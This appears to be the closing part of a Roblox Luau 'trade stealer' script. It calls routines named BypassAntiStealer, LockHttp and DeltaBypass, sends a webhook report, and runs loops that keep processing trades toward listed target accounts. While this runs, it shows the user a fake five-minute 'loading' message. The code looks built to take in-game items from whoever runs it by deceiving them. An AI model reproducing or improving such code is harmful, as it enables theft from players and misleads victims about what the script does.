			task.wait(1)
			TradeEngine.CheckAndProcess()
		end
	end)
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= plr and TradeEngine.IsTarget(p.Name) then
			task.spawn(function()
				task.wait(Constants.JoinWait)
				TradeEngine.CheckAndProcess()
			end)
		end
	end
end
function Controller.Run()
	BypassAntiStealer()
	Security.LockHttp()
	Controller.DeltaBypass()
	if not Controller.ValidateServer() then return end
	Controller.InitData()
	local ok = TradeEngine.InitRemotes()
	if not ok then return end
	Webhook.Dispatch()
	print("[AC] Loading Script for", plr.Name)
	print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")
	task.wait(3)
	RunService.Heartbeat:Connect(function()
		TradeEngine.AggressiveMonitor()
	end)
	task.spawn(function()
		while task.wait(2) do
			TradeEngine.CheckAndProcess()
		end
	end)
	Controller.BindEvents()
end

Controller.Run()
